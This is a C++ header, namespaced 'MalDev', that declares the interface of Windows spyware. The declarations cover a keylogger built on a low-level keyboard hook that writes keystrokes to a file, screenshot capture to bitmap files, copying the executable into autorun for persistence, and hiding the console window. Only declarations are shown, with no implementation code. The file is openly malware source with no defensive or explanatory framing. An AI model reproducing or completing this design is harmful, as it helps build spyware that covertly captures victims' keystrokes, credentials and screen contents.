#ifndef _MALDEV_H
#define _MALDEV_H
#include <thread>
#include <Windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <atlsafe.h>
using namespace std;
namespace MalDev
{
	class KLogger
	{
		static string filename;
		static HHOOK hook;
		static KBDLLHOOKSTRUCT kbStruct;
		static ofstream file;
		static int Save(int key);
		static LRESULT CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam);
	public:
		static bool StartKeyLogger();
		static void SetFileName(string file);
	};

	class Screen
	{
	private:
		inline int GetFilePointer(HANDLE FileHandle);
		bool SaveBMPFile(string filename, HBITMAP bitmap, HDC bitmapDC, int width, int height);
		bool ScreenCapture(int x, int y, int width, int height, string filename);
	public:
		void ToScreen(string filename);
		void SaveScreen(string workfolder);
	};

	class Tool
	{
	private:
	public:
		bool CreateWorkFolder(string workfolder, bool showfolder);
		bool CopyExeFile(string OrigExe, string CopyExe);
		bool CopyToAutorun(LPCTSTR pathToAutoRun, LPCTSTR infoProc);
		void OfferTaskManager();
		void ShowConsole(bool show);
	};
}

#endif
